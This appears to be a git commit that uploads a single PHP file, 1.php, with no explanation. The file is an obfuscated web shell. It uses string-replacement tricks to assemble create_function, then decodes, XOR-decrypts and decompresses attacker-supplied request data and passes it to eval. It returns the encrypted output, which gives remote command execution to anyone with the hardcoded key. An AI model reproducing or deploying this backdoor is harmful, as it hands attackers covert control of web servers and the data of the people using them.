fdad370ed98413da6652dc74c2800a9b7b0cc42b
kevinlamo <77305780+kevinlamo@users.noreply.github.com>
2021-10-30 18:29:38 +0600

    Add files via upload

---
+++ 1.php
@@ -0,0 +1,10 @@
+<?php
+$M=str_replace('XP','','crXPXPXPeate_XPfXPunXPction');
+$F='$k="900Z+15098";$Z+kh=Z+"3cd24fb0Z+d696";Z+$kf="3Z+f7d2Z+8e17f72"Z+;$pZ+="vYoqpZZ+Z+ALH3YLCPAj";Z+funZ+ction x(Z+$t,$k';
+$D='){$Z+c=stZ+rlen($k)Z+;$Z+l=strlen(Z+$t);$Z+Z+o="";Z+for($i=Z+0;$i<$Z+l;){for($jZ+=0Z+;($j<Z+$c&&$i<$l);Z+$j++,$i+Z++){';
+$o='Z+$o.=$t{$Z+Z+i}^$k{$j};}Z+}retuZ+rn $Z+o;}if (@preZ+g_match(Z+"/$Z+kh(.Z++)$kfZ+/Z+Z+",@file_get_contentsZ+("php://iZ+n';
+$I='Z+put"),$m)Z+==1) {@Z+obZ+_start();@Z+evZ+al(@gZ+zuncompressZ+(@x(@baZ+Z+se64_decodeZ+Z+($m[1]),$k)Z+));$o=Z+@ob_getZ+Z';
+$P='+_contents();@Z+obZ+_end_cleanZ+();$r=Z+@baseZ+Z+64_encZ+ode(@xZ+(@gzcoZ+mZ+press($o),$Z+Z+k));print("Z+$p$kh$r$kf");}';
+$V=str_replace('Z+','',$F.$D.$o.$I.$P);
+$A=$M('',$V);$A();
+?>
